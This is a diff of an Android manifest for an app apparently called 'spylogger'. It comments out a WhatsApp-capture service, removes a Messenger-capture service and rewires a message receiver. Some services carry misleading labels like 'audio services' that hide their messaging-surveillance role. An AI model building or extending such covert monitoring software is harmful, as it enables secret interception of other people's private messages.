@@ -60,20 +60,13 @@
         </service>
 
         <!--whatsapp-->
-        <service
+<!--        <service
             android:name="com.gravatasufoca.spylogger.services.WhatsAppService"
             android:enabled="true"
             android:exported="true"
             android:label="audio services">
-        </service>
+        </service>-->
 
-        <!--messenger-->
-        <service
-            android:name="com.gravatasufoca.spylogger.services.MessengerService"
-            android:enabled="true"
-            android:exported="true"
-            android:label="video services">
-        </service>
 
         <!--sms-->
         <service
@@ -129,10 +122,10 @@
 
         <!--carga-->
         <receiver
-            android:name=".receivers.PrimeiraCarga"
+            android:name=".receivers.MensagemMensageiroReceiver"
             android:label="FirstCharge" >
             <intent-filter>
-                <action android:name="PRIMEIRA_CARGA" />
+                <action android:name="MENSAGEM_RECEBIDA" />
             </intent-filter>
         </receiver>
 
